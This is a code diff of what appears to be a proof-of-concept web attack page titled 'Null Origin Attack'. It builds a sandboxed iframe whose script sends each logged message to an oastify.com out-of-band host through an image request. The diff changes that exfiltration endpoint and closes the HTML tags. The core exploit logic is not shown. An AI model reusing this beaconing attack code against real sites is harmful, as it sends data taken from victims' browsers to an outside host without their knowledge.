@@ -26,7 +26,7 @@ sandbox1.srcdoc = `
 <h3>Sandbox (Null Origin Attack)</h3>
 <div id="s1" style="font-family:monospace;font-size:11px;"></div>
 <script>
-const E1 = 'https://br6v4frky5l1xsredqgblixfc6ix6oud.oastify.com';
+const E1 = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 function l1(m) {
     document.getElementById('s1').innerHTML += '<br>' + m;
     new Image().src = E1 + '/?s=' + encodeURIComponent(m);
@@ -116,6 +116,9 @@ if (!hub) {
         }
     }, 100);
 }
+</script>
+</body>
+</html>
 `;
 
 document.body.appendChild(sandbox1);
